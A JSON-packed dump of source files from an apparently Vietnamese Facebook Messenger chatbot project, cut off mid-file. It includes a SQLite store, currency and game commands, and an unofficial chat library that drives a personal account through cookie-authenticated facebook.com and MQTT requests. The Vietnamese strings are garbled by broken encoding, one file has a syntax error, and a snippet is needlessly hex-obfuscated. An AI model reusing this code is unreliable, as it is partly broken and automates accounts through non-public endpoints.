fetched;\n            }\n            let oldValue = get(fetched, params.ops.target);\n            if (oldValue === undefined) oldValue = 0;\n            else if (isNaN(oldValue)) throw new Error(`Data @ ID: \"${params.id}\" IS NOT A number.\\nFOUND: ${fetched}\\nEXPECTED: number`);\n            params.data = set(fetched, params.ops.target, oldValue + JSON.parse(params.data));\n        } \n        else {\n            if (fetched.json === '{}') fetched.json = 0;\n            try { \n                fetched.json = JSON.parse(fetched); \n            } catch (e) {\n                fetched.json = fetched.json;\n            }\n            if (isNaN(fetched.json)) throw new Error(`Data @ ID: \"${params.id}\" IS NOT A number.\\nFOUND: ${fetched.json}\\nEXPECTED: number`);\n            params.data = parseInt(fetched.json, 10) + parseInt(params.data, 10);\n        }\n        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(JSON.stringify(params.data), params.id);\n        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;\n        if (newData === '{}') return null;\n        else {\n            try {  \n                newData = JSON.parse(newData); \n            } \n            catch (e) {\n                newData = newData;\n            }\n            return newData;\n        }\n    },\n    subtract: function subtractDB(db, params, options) {\n       let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) {\n            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');\n            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id); \n        }\n        if (params.ops.target) {\n            try { fetched = JSON.parse(fetched); } catch (e) {}\n            params.data = JSON.parse(params.data);\n            let oldValue = get(fetched, params.ops.target);\n            if (oldValue === undefined) oldValue = 0;\n            else if (isNaN(oldValue)) throw new Error('Target is not a number.');\n            params.data = set(fetched, params.ops.target, oldValue - params.data);\n        } else {\n            if (fetched.json === '{}') fetched.json = 0;\n            else fetched.json = JSON.parse(fetched.json);\n            try { fetched.json = JSON.parse(fetched); } catch (e) {}\n            if (isNaN(fetched.json)) throw new Error('Target is not a number.');\n            params.data = parseInt(fetched.json, 10) - parseInt(params.data, 10);\n        }\n        params.data = JSON.stringify(params.data);\n        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(params.data, params.id);\n        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;\n        if (newData === '{}') return null;\n        else {\n            try { newData = JSON.parse(newData); } catch (e) {}\n            return newData;\n        }\n    },\n    push: function pushDB(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) {\n            db.prepare(`INSERT INTO ${options.table} (ID,json) VALUES (?,?)`).run(params.id, '{}');\n            fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id); \n        }\n        if (params.ops.target) {\n            fetched = JSON.parse(fetched.json);\n        try { fetched = JSON.parse(fetched); } catch (e) {}\n            params.data = JSON.parse(params.data);\n        if (typeof fetched !== 'object') throw new TypeError('Cannot push into a non-object.');\n        let oldArray = get(fetched, params.ops.target);\n        if (oldArray === undefined) oldArray = [];\n        else if (!Array.isArray(oldArray)) throw new TypeError('Target is not an array.');\n            oldArray.push(params.data);\n            params.data = set(fetched, params.ops.target, oldArray);\n        } else {\n        if (fetched.json === '{}') fetched.json = [];\n        else fetched.json = JSON.parse(fetched.json);\n        try { fetched.json = JSON.parse(fetched.json); } catch (e) {}\n            params.data = JSON.parse(params.data);\n        if (!Array.isArray(fetched.json)) throw new TypeError('Target is not an array.');\n            fetched.json.push(params.data);\n            params.data = fetched.json;\n        }\n        params.data = JSON.stringify(params.data);\n        db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(params.data, params.id);\n        let newData = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id).json;\n        if (newData === '{}') return null;\n        else {\n            newData = JSON.parse(newData);\n        try { newData = JSON.parse(newData); } catch (e) {}\n        return newData;\n        }\n    },\n    delete: function deleteDB(db, params, options) {\n        const unset = require('lodash/unset');\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) return false;\n        else fetched = JSON.parse(fetched.json);\n        try { fetched = JSON.parse(fetched); } catch (e) {}\n        if (typeof fetched === 'object' && params.ops.target) {\n            unset(fetched, params.ops.target);\n            fetched = JSON.stringify(fetched);\n            db.prepare(`UPDATE ${options.table} SET json = (?) WHERE ID = (?)`).run(fetched, params.id);\n        return true;\n        }\n        else if (params.ops.target) throw new TypeError('Target is not an object.');\n        else db.prepare(`DELETE FROM ${options.table} WHERE ID = (?)`).run(params.id);\n        return true;\n    },\n    has: function hasDB(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) return false;\n        else fetched = JSON.parse(fetched.json);\n        try { fetched = JSON.parse(fetched); } catch (e) {}\n        if (params.ops.target) fetched = get(fetched, params.ops.target);\n        return (typeof fetched != 'undefined');\n    },\n    all: function allDB(db, params, options) {\n        var stmt = db.prepare(`SELECT * FROM ${options.table} WHERE ID IS NOT NULL`);\n        let resp = [];\n        for (var row of stmt.iterate()) {\n            try {\n            resp.push({\n                ID: row.ID,\n                data: JSON.parse(row.json)\n            });\n            } \n            catch (e) {\n                return [];\n            }\n        }\n        return resp;\n    },\n    type: function typeDB(db, params, options) {\n        let fetched = db.prepare(`SELECT * FROM ${options.table} WHERE ID = (?)`).get(params.id);\n        if (!fetched) return null; // If empty, return null\n        fetched = JSON.parse(fetched.json);\n        try { fetched = JSON.parse(fetched); } catch (e) {}\n        if (params.ops.target) fetched = get(fetched, params.ops.target); // Get prop using dot notation\n        return typeof fetched;\n    },\n    clear: function clearDB(db, params, options) {\n        let fetched = db.prepare(`DELETE FROM ${options.table}`).run();\n        if(!fetched) return null;\n        return fetched.changes;\n        \n    }\n};\n\n\nfunction arbitrate(method, params) {\n    let options = {table: \"json\"};\n    db.prepare(`CREATE TABLE IF NOT EXISTS ${options.table} (ID TEXT, json TEXT)`).run();\n    if (params.ops.target && params.ops.target[0] === \".\") params.ops.target = params.ops.target.slice(1); // Remove prefix if necessary\n    if (params.data && params.data === Infinity) throw new TypeError(`You cannot set Infinity into the database @ ID: ${params.id}`);\n    if (params.id && typeof params.id == \"string\" && params.id.includes(\".\")) {\n        let unparsed = params.id.split(\".\");\n        params.id = unparsed.shift();\n        params.ops.target = unparsed.join(\".\");\n    }\n    return methods[method](db, params, options);\n}\n\n\nmodule.exports = function ChernobyL(Local) {\n    if (Local && process.env[\"REPL_ID\"]) {\n        return {\n            set: Lset,\n            get: Lget,\n            has: Lhas,\n            delete: Lremove,\n            deleteMultiple: LremoveMultiple,\n            list: Llist\n        };\n    } else if (!Local && process.env[\"REPL_ID\"]) {\n        return {\n            set: Replit_Set,\n            get: Replit_Get,\n            has: Replit_Has,\n            delete: Replit_Remove,\n            deleteMultiple: Replit_RemoveMultiple,\n            list: Replit_List\n        };\n    }\n    else if (Local && !process.env[\"REPL_ID\"]) {\n        return {\n            set: Lset,\n            get: Lget,\n            has: Lhas,\n            delete: Lremove,\n            deleteMultiple: LremoveMultiple,\n            list: Llist\n        };\n    }\n    else if (!Local && !process.env[\"REPL_ID\"]) {\n        return {\n            set: Lset,\n            get: Lget,\n            has: Lhas,\n            delete: Lremove,\n            deleteMultiple: LremoveMultiple,\n            list: Llist\n        };\n    }\n    else {\n        return {\n            set: Lset,\n            get: Lget,\n            has: Lhas,\n            delete: Lremove,\n            deleteMultiple: LremoveMultiple,\n            list: Llist\n        };\n    }\n};","path":null,"size_bytes":15930,"size_tokens":null},"lib/fca-auto/src/Premium.js":{"content":"\"use strict\";\n\nvar { join } = require('path');\nvar fs = require('fs');\n\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function(Name, args){\n        var Method = {};\n        fs.readdirSync(join(__dirname, \"../Func\")).filter((/** @type {string} */File) => File.endsWith(\".js\") && !File.includes('Dev_')).map((/** @type {string} */File) => Method[File.split('.').slice(0, -1).join('.')] = require(`../Func/${File}`)(defaultFuncs, api, ctx));\n        if (Method[Name] == undefined) {\n            return (`Method ${Name} not found`);\n        }\n        else {\n            try {\n                return Method[Name](args).then((/** @type {string} */Data) => {\n                    return Data;\n                });\n            }\n            catch (e) {\n                console.log(e);\n            }\n        }\n    };    \n};","path":null,"size_bytes":831,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/Dev_shareTest2.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\treturn async function shareTest(text, senderID, threadID, callback) {\n\t\tvar resolveFunc = function () { };\n\t\tvar rejectFunc = function () { };\n\t\tvar returnPromise = new Promise(function (resolve, reject) {\n\t\t\tresolveFunc = resolve;\n\t\t\trejectFunc = reject;\n\t\t});\n\t\tif (!callback) {\n\t\t\tcallback = function (err, data) {\n\t\t\t\tif (err) return rejectFunc(err);\n\t\t\t\tresolveFunc(data);\n\t\t\t};\n\t\t}\n\t\tctx.req_ID++;\n\t\tvar form = JSON.stringify({\n\t\t\t\t\t\t\"app_id\": \"2220391788200892\",\n\t\t\t\t\t\t\"payload\": JSON.stringify({\n\t\t\t\t\t\t\t\ttasks: [{\n                                    label: '46',\n\t\t\t\t\t\t\t\t\t\tpayload: JSON.stringify({\n\t\t\t\t\t\t\t\t\t\t\t//\"contact_id\": senderID,\n                                            \"otid\": utils.generateOfflineThreadingID(),\n                                            \"source\": \"1572866\",\n\t\t\t\t\t\t\t\t\t\t\t\"sync_group\": 1,\n                                            \"send_type\": 7,\n                                            \"mark_thread_read\": 1,\n                                            \"url\": \"\",\n                                            \"attribution_app_id\": ,\n                                            \"skip_url_preview_gen\": 0,\n                                            \"text_has_links\": 0,\n                                            \"multitab_env\": 0,\n\t\t\t\t\t\t\t\t\t\t\t//\"text\": text || \"\",\n\t\t\t\t\t\t\t\t\t\t\t\"thread_id\": 6711308795587598,\n                                            \"initiating_source\": 0\n\t\t\t\t\t\t\t\t\t\t}),\n\t\t\t\t\t\t\t\t\t\tqueue_name: '6711308795587598',\n\t\t\t\t\t\t\t\t\t\ttask_id: Math.random() * 1001 << 0,\n\t\t\t\t\t\t\t\t\t\tfailure_count: null,\n\t\t\t\t\t\t\t\t},\n                            {\n                                label: '21',\n                                payload: JSON.stringify({\n                                    \"thread_id\": 6711308795587598,\n                                    last_read_watermark_ts: 1713035994383,\n                                    sync_group: 1\n                                }),\n                                queue_name: 6711308795587598,\n                                task_id: Math.random() * 1001 << 0,\n                                failure_count: null\n                            }],\n\t\t\t\t\t\t\t\tepoch_id: utils.generateOfflineThreadingID(),\n\t\t\t\t\t\t\t\tversion_id: '7191105584331330',\n                                data_trace_id: \"\"\n\t\t\t\t\t\t}),\n\t\t\t\t\t\t\"request_id\": ctx.req_ID,\n\t\t\t\t\t\t\"type\": 3\n\t\t\t\t});\n\t\tctx.mqttClient.publish('/ls_req',form)\n\n\t\treturn returnPromise;\n\t};\n};\n","path":null,"size_bytes":2550,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Src/Last-Run.js":{"content":"/* eslint-disable linebreak-style */\n'use strict';\n\nvar assert = require('assert');\n\nvar runtimes = new WeakMap();\n\n/**\n * @param {any} fn\n */\nfunction isFunction(fn) {\n  return typeof fn === 'function';\n}\n\n/**\n * @param {object} fn\n * @param {string} timeResolution\n */\nfunction lastRun(fn, timeResolution) {\n  assert(isFunction(fn), 'Only functions can check lastRun');\n\n  var time = runtimes.get(fn);\n  \n  if (time == null) {\n    return;\n  }\n\n  var resolution = parseInt(timeResolution, 10) || 1; \n  return time - (time % resolution);\n}\n\n/**\n * @param {object} fn\n * @param {number} timestamp\n */\nfunction capture(fn, timestamp) {\n  assert(isFunction(fn), 'Only functions can be captured');\n\n  timestamp = timestamp || Date.now();\n\n  runtimes.set(fn, timestamp);\n}\n\n/**\n * @param {object} name\n */\nfunction has(name) {\n  return runtimes.has(name);\n}\n\n/**\n * @param {object} fn\n */\nfunction release(fn) {\n  assert(isFunction(fn), 'Only functions can be captured');\n\n  runtimes.delete(fn);\n}\n\nmodule.exports = {\n    lastRun,\n    capture,\n    release,\n    has\n};","path":null,"size_bytes":1062,"size_tokens":null},"includes/controllers/currencies.js":{"content":"module.exports = function ({ models }) {\r\n\tconst Currencies = models.use('Currencies');\r\n\r\n\tasync function getAll(...data) {\r\n\t\tvar where, attributes;\r\n\t\tfor (const i of data) {\r\n\t\t\tif (typeof i != 'object') throw global.getText(\"currencies\", \"needObjectOrArray\");\r\n\t\t\tif (Array.isArray(i)) attributes = i;\r\n\t\t\telse where = i;\r\n\t\t}\r\n\t\ttry { return (await Currencies.findAll({ where, attributes })).map(e => e.get({ plain: true })) }\r\n\t\tcatch (error) {\r\n\t\t\tconsole.error(error);\r\n\t\t\tthrow new Error(error);\r\n\t\t};\r\n\t}\r\n\r\n\tasync function getData(userID) {\r\n\t\ttry {\r\n\t\t\tconst data = await Currencies.findOne({ where: { userID }});\r\n\t\t\tif (data) return data.get({ plain: true });\r\n\t\t\telse return false;\r\n\t\t} \r\n\t\tcatch (error) {\r\n\t\t\tconsole.error(error);\r\n\t\t\tthrow new Error(error);\r\n\t\t};\r\n\t}\r\n\r\n\tasync function setData(userID, options = {}) {\r\n\t\tif (typeof options != 'object' && !Array.isArray(options)) throw global.getText(\"currencies\", \"needObject\");\r\n\t\ttry {\r\n\t\t\t(await Currencies.findOne({ where: { userID } })).update(options);\r\n\t\t\treturn true;\r\n\t\t} \r\n\t\tcatch (error) {\r\n\t\t\tconsole.error(error);\r\n\t\t\tthrow new Error(error);\r\n\t\t}\r\n\t}\r\n\r\n\tasync function delData(userID) {\r\n\t\ttry {\r\n\t\t\t(await Currencies.findOne({ where: { userID } })).destroy();\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\tcatch (error) {\r\n\t\t\tconsole.error(error);\r\n\t\t\tthrow new Error(error);\r\n\t\t}\r\n\t}\r\n\r\n\tasync function createData(userID, defaults = {}) {\r\n\t\tif (typeof defaults != 'object' && !Array.isArray(defaults)) throw global.getText(\"currencies\", \"needObject\");\r\n\t\ttry {\r\n\t\t\tawait Currencies.findOrCreate({ where: { userID }, defaults });\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\tcatch (error) {\r\n\t\t\tconsole.error(error);\r\n\t\t\tthrow new Error(error);\r\n\t\t}\r\n\t}\r\n\r\n\tasync function increaseMoney(userID, money) {\r\n\t\tif (typeof money != 'number') throw global.getText(\"currencies\", \"needNumber\");\r\n\t\ttry {\r\n\t\t\tlet balance = (await getData(userID)).money;\r\n\t\t\tawait setData(userID, { money: balance + money });\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\tcatch (error) {\r\n\t\t\tconsole.error(error);\r\n\t\t\tthrow new Error(error);\r\n\t\t}\r\n\t}\r\n\r\n\tasync function decreaseMoney(userID, money) {\r\n\t\tif (typeof money != 'number') throw global.getText(\"currencies\", \"needNumber\");\r\n\t\ttry {\r\n\t\t\tlet balance = (await getData(userID)).money;\r\n\t\t\tif (balance < money) return false;\r\n\t\t\tawait setData(userID, { money: balance - money });\r\n\t\t\treturn true;\r\n\t\t} catch (error) {\r\n\t\t\tconsole.error(error);\r\n\t\t\tthrow new Error(error);\r\n\t\t}\r\n\t}\r\n\r\n\treturn {\r\n\t\tgetAll,\r\n\t\tgetData,\r\n\t\tsetData,\r\n\t\tdelData,\r\n\t\tcreateData,\r\n\t\tincreaseMoney,\r\n\t\tdecreaseMoney\r\n\t};\r\n};","path":null,"size_bytes":2554,"size_tokens":null},"lib/fca-auto/Extra/ExtraUptimeRobot.js":{"content":"'use strict';\n\nconst logger = require(\"../logger\");\nmodule.exports = function() {\n    var Logger = global.Fca.Require.logger;\n    switch (process.platform) {\n        case 'win32': {\n            if (global.Fca.Require.FastConfig.Uptime) {\n                logger.Warning(global.Fca.Require.Language.ExtraUpTime.NotSupport);\n            }\n            break;\n        }\n        case 'darwin': {\n            if (global.Fca.Require.FastConfig.Uptime) {\n                logger.Warning(global.Fca.Require.Language.ExtraUpTime.NotSupport);\n            }\n            break;\n        }\n        case 'linux':\n            if (process.env.REPL_SLUG) {\n                var Value = global.Fca.Require.FastConfig;\n                var Fetch = global.Fca.Require.Fetch;\n                    if (Value.Uptime) {\n                        logger.Normal(global.Fca.Require.Language.ExtraUpTime.Uptime);//\n                        return setInterval(function() {\n                            Fetch.get(`https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`);\n                        },10*1000);\n                    }\n                else return;\n            }\n            else { \n                Logger.Warning(global.Fca.Require.Language.ExtraUpTime.NotSupport);\n            }  \n            break;\n        default:\n        Logger.Warning(global.Fca.Require.Language.ExtraUpTime.NotSupport);\n    }\n};","path":null,"size_bytes":1384,"size_tokens":null},"modules/commands/thamgia.js":{"content":"module.exports.config = {\n name: \"thamgia\",\n version: \"1.0.0\", \n hasPermssion: 3,\n credits: \"TatsuYTB\",\n description: \"Th√™m baÃ£n vaÃÄo nhoÃÅm maÃÄ bot ƒëang ∆°Ãâ\",\n commandCategory: \"H·ªá Th·ªëng\", \n usages: \"thamgia\", \n cooldowns: 0,\n dependencies: {}\n};\nmodule.exports.handleReply = async ({ event, api, handleReply, Threads }) => {\n    var { threadID, messageID, body, senderID } = event;\n    var { threadList, author } = handleReply;\n   if (handleReply.author != event.senderID) return api.sendMessage(\"?????\", threadID, messageID)\n    if (!body || !parseInt(body)) return api.sendMessage('L·ª±a ch·ªçn c·ªßa b·∫°n ph·∫£i l√† m·ªôt con s·ªë.', threadID, messageID);\n    if (!threadList[parseInt(body) - 1]) return api.sendMessage(\"L·ª±a ch·ªçn c·ªßa b·∫°n kh√¥ng n·∫±m trong danh s√°ch\", threadID, messageID);\n    else {\n        try {\n            var threadInfo = threadList[parseInt(body) - 1];\n            var { participantIDs } = threadInfo;\n            if (participantIDs.includes(senderID)) return api.sendMessage('‚Üí B·∫°n ƒë√£ c√≥ m·∫∑t trong nh√≥m n√†y.', threadID, messageID);\n            api.addUserToGroup(senderID, threadInfo.threadID, (e) => {\n              if (e) api.sendMessage(`ƒê√£ x·∫£y ra l·ªói: ${e.errorDescription}`, threadID, messageID);\n              else api.sendMessage(`‚Üí Bot ƒë√£ th√™m b·∫°n v√†o nh√≥m ${threadInfo.name} r·ªìi nka. Ki·ªÉm tra ·ªü m·ª•c spam ho·∫∑c tin nh·∫Øn ch·ªù n·∫øu kh√¥ng th·∫•y box nka.`, threadID, messageID);\n            });\n        }\n        catch (error) {\n            return api.sendMessage(`Ch∆∞a th√™Ãâ th∆∞Ã£c thi ${error}`, threadID, messageID);\n        }\n    }\n};\nmodule.exports.run = async function({ api, event }) {\nconst permission = [\"100040472494187\"];\n         if (!permission.includes(event.senderID)) return api.sendMessage(\"B·∫°n kh√¥ng c√≥ quy·ªÅn\", event.threadID, event.messageID);\t\nconst { threadID, messageID, senderID } = event;\n    const commandName = this.config.name;\n    var msg = \"\", index = 1;\n    try {\n    var spam = await api.getThreadList(50, null, [\"INBOX\"]) || [];\n  } catch (e) { return api.sendMessage(`‚Üí Kh√¥ng th√™Ãâ l√¢ÃÅy danh saÃÅch nhoÃÅm\\nVui loÃÄng th∆∞Ãâ laÃ£i sau`, threadID, messageID) }\n  const list = [...spam].filter(group => group.isSubscribed && group.isGroup);\n    for (const single of list) \n      msg += `${index++}.${single.name}\\n`;\n  var tpk = `‚¨áÔ∏è==== [ ùóßùóõùóîùó† ùóöùóúùóî ] ====‚¨áÔ∏è\n  ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n‚ù§ ùóõùó∂ùó≤Ã£ÃÇùóª ùòÅùóÆÃ£ùó∂ ùó∞ùóºÃÅ ${list.length} ùóªùóµùóºÃÅùó∫ ùóØùóºùòÅ ƒëùóÆùóªùó¥ ùóµùóºùóÆÃ£ùòÅ ƒëùóºÃ£ÃÇùóªùó¥\\n\\n`;\n    if (list.length != 0) return api.sendMessage(tpk + msg + `\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n‚ö†Ô∏è ùó•ùó≤ùóΩùóπùòÜ ùòÅùó∂ùóª ùóªùóµùóÆÃÜÃÅùóª ùóªùóÆÃÄùòÜ ùó∏ùó≤ÃÄùó∫ ùòÄùóºÃÇÃÅ ùòÅùòÇÃõùóºÃõùóªùó¥ ùòÇÃõÃÅùóªùó¥ ùòÉùóºÃõÃÅùó∂ ùóØùóºùòÖ ùó∫ùóÆÃÄ ùóØùóÆÃ£ùóª ùó∫ùòÇùóºÃÇÃÅùóª ùòÉùóÆÃÄùóº\\nüå∏ ùóßùóºÃÇÃâùóªùó¥ ùóªùóµùóºÃÅùó∫ ƒëùóÆÃÉ ùóπùòÇÃõùòÇ ùòÉùóÆÃÄùóº ùó±ùòÇÃõÃÉ ùóπùó∂ùó≤Ã£ÃÇùòÇ ùóµùó≤Ã£ÃÇ ùòÅùóµùóºÃÇÃÅùóªùó¥: ${global.data.allThreadID.length} ùóªùóµùóºÃÅùó∫`, threadID, (error, info) => {\n    global.client.handleReply.push({\n            name: commandName,\n            messageID: info.messageID,\n            author: senderID,\n            threadList: list\n\n        });\n  }, messageID);\n    else return api.sendMessage(`[ L√¥ÃÉi ] #244`, threadID, messageID);\n}","path":null,"size_bytes":3495,"size_tokens":null},"lib/fca-auto/Extra/Security/Index.js":{"content":"/* eslint-disable linebreak-style */\nmodule.exports = {\n    Default: require('./Base'),\n    GCM: require('./AES_256_GCM')\n};","path":null,"size_bytes":124,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/removeUserFromGroup.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function removeUserFromGroup(userID, threadID, callback) {\n    if (!callback && (utils.getType(threadID) === \"Function\" || utils.getType(threadID) === \"AsyncFunction\")) throw { error: \"please pass a threadID as a second argument.\" };\n    if (utils.getType(threadID) !== \"Number\" && utils.getType(threadID) !== \"String\") throw { error: \"threadID should be of type Number or String and not \" + utils.getType(threadID) + \".\" };\n    if (utils.getType(userID) !== \"Number\" && utils.getType(userID) !== \"String\") throw { error: \"userID should be of type Number or String and not \" + utils.getType(userID) + \".\" };\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      uid: userID,\n      tid: threadID\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/chat/remove_participants\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (!resData) throw { error: \"Remove from group failed.\" };\n\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"removeUserFromGroup\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1653,"size_tokens":null},"modules/commands/caro.js":{"content":"module.exports.config = {\n    name: 'caro',\n    version: '1.0.0',\n    hasPermssion: 0,\n    credits: 'Darkness',\n    description: 'game c·ªù caro',\n    commandCategory: 'Tr√≤ Ch∆°i',\n    usages: '@tag',\n    cooldowns: 5,\n    dependencies: {\n      \"fs-extra\": \"\",\n      \"axios\": \"\",\n      \"canvas\": \"\",\n      \"jimp\": \"\",\n      \"node-superfetch\": \"\"\n    }\n};\n\nmodule.exports.handleReply = async ({ handleReply, event, api ,Users}) => {\n  function delay(ms) {\n       return new Promise(resolve => setTimeout(resolve, ms));\n  };\n  var {x, y, d, d1, sizeboard, sectionSize, boardbuffer} = handleReply;\n    var { threadID, senderID, messageID, body } = event;\n    const chalk = global.nodemodule[\"chalk\"];\n    var args   = body.split(' ');\n    if(!args[1]) return api.sendMessage(\"B·∫°n ch∆∞a nh·∫≠p t·ªça ƒë·ªô Y\", threadID, messageID);\n    var toadoX = parseInt(args[0]),\n        toadoY = parseInt(args[1]);\n          //check error t·ªça ƒë·ªô\n          if(toadoX == NaN || toadoY == NaN) return api.sendMessage(\"T·ªça ƒë·ªô X ho·∫∑c Y kh√¥ng h·ª£p l·ªá\", threadID, messageID);\n          if(toadoX > sizeboard) return api.sendMessage(\"T·ªça ƒë·ªô X kh√¥ng ƒë∆∞·ª£c l·ªõn h∆°n s·ªë √¥ c·ªßa b√†n c·ªù\", threadID, messageID);\n          if(toadoY > sizeboard) return api.sendMessage(\"T·ªça ƒë·ªô Y kh√¥ng ƒë∆∞·ª£c l·ªõn h∆°n s·ªë √¥ c·ªßa b√†n c·ªù\", threadID, messageID);\n      //get data game\n    var gameint  = global.game[threadID];\n    var luot     = gameint.ditruoc;\n    var luotuser = gameint.luot[senderID];\n    //===========\n    if (global.game[threadID].toadogame.includes(toadoX.toString() + toadoY)) return api.sendMessage('V·ªã tr√≠ n√†y ƒë√£ ƒë∆∞·ª£c ƒë√°nh t·ª´ tr∆∞·ªõc', threadID, messageID);\n\nvar _0xb4b2=[\"\\x6C\\x75\\x6F\\x74\",\"\\x6B\\x65\\x79\\x73\",\"\\x66\\x69\\x6C\\x74\\x65\\x72\",\"\\x6E\\x61\\x6D\\x65\",\"\\x67\\x65\\x74\\x44\\x61\\x74\\x61\"];var arrluot=Object[_0xb4b2[1]](gameint[_0xb4b2[0]]);var iddoithu=parseInt(arrluot[_0xb4b2[2]]((_0xd327x3)=>{return _0xd327x3!= senderID}));var namedoithu=( await Users[_0xb4b2[4]](iddoithu))[_0xb4b2[3]]\n    //=============Check l∆∞·ª£t===========//\n    if (luotuser != luot) {\n      return api.sendMessage({body: 'Ch∆∞a t·ªõi l∆∞·ª£t c·ªßa b·∫°n!! L∆∞·ª£t n√†y l√† c·ªßa '+namedoithu, mentions: [{tag: namedoithu,id: iddoithu}]}, threadID, messageID);\n    };\n    if (luot == 0) {\n        global.game[threadID].ditruoc = 1;\n        var quanco = 'X';\n        var linkCo = 'https://i.ibb.co/ByyrhMs/Xpng.png';\n    };\n    if (luot == 1) {\n        global.game[threadID].ditruoc = 0;\n        var quanco = 'O';\n        var linkCo = 'https://i.ibb.co/FgtkNM9/Opng.png';\n    };\n    \n  //d th·ª© [x+y][x]\n  //X = 4, Y = 2;\n  //set c·ªù v√†o data ƒë·ªÉ check WIN;\n  //==============PUSH DATA===========//\n  if(toadoY > toadoX) var soptu = toadoY-toadoX;\n  else var soptu = toadoX-toadoY;\n  var soo = sizeboard - 1;//s·ªë √¥\n    x[toadoY][toadoX]               = quanco;\n    y[toadoX][toadoY]               = quanco;\n    d[toadoX +toadoY][toadoX]       = quanco;\n    d1[soo-soptu][toadoX]           = quanco;\n    //===============khai b√°o==============\n    const Canvas = global.nodemodule[\"canvas\"];\n    const fs = global.nodemodule[\"fs-extra\"];\n    var path1 = __dirname+'/cache/caro1'+threadID+'.png';\n    var path2 = __dirname+'/cache/caro2'+threadID+'.png';\n    //===========CANVAS============//\n    //v·∫Ω l·∫°i boardgame tr∆∞·ªõc sau ƒë√≥ v·∫Ω l√™n background\n    const boardgame = await Canvas.loadImage(boardbuffer);//board l·∫•y t·ª´ handleReply\n    var xboard = boardgame.width,\n        yboard = boardgame.height;\n    const canvas = Canvas.createCanvas(xboard, yboard);\n    let ctx = canvas.getContext('2d');\n    ctx.drawImage(boardgame, 0, 0, xboard, yboard);\n    var quanCo = await Canvas.loadImage(linkCo);//l·∫•y ·∫£nh qu√¢n c·ªù\n    ctx.drawImage(quanCo, toadoX * sectionSize, toadoY * sectionSize, sectionSize, sectionSize);\n    var boardbuffer = canvas.toBuffer();//v·∫Ω xong board game\n    //=============BACKGROUND================\n    const background = await Canvas.loadImage(path2);\n    var xbground = background.width,\n        ybground = background.height;\n    const canvasbg = Canvas.createCanvas(xbground, ybground);\n    const ctxx = canvasbg.getContext('2d');\n    ctxx.drawImage(background, 0, 0, xbground, ybground);\n    const board = await Canvas.loadImage(boardbuffer);\n    ctxx.drawImage(board, (xbground-880)/2, 320, 880, 880);\n    //==============================\n    global.game[threadID].toadogame.push(toadoX.toString() + toadoY);\n    //=========FUNCTION CHECK WIN??===========\n  function checkWin(x, y, d, d1, toadoX, toadoY, quanco, sizeboard, sectionSize) {\n    var dem = 0;\n    //============CHECK X=============\n\n    for (let X of x[toadoY]) {\n        if(X == quanco) {\n          dem++;\n        } else {\n          dem = 0;\n\n        }\n        if (dem == 5) {\n          return {\n            WIN: true\n          }\n        }\n    };\n    dem = 0;\n    //============CHECK Y============\n    for (let Y of y[toadoX]) {\n        if (Y == quanco) {\n            dem++;\n        } else { \n            dem = 0;\n        }\n        if (dem == 5) {\n          return {\n            WIN: true\n          }\n        }\n    }\n    //============CHECK D============\n    dem = 0;\n    for (let D of d[toadoX+toadoY]) {\n        if (D == quanco) {\n            dem++;\n        } else {\n            dem = 0;\n        }\n        if (dem == 5) {\n          return {\n            WIN: true\n          }\n        };\n    };\n  //==============CHECK D1===========\n    dem = 0;\n    var soo = sizeboard-1;\n    if(toadoY > toadoX) {var soptu = toadoY-toadoX;}\n    else {var soptu = toadoX-toadoY;};\n    for (let D1 of d1[soo-soptu]) {\n        if (D1 == quanco) {\n            dem++;\n        } else {dem = 0;}\n        if(dem == 5) {\n          return {\n            WIN: true\n          }\n        }\n    };\n    return {WIN: false};\n  };\n  \n var 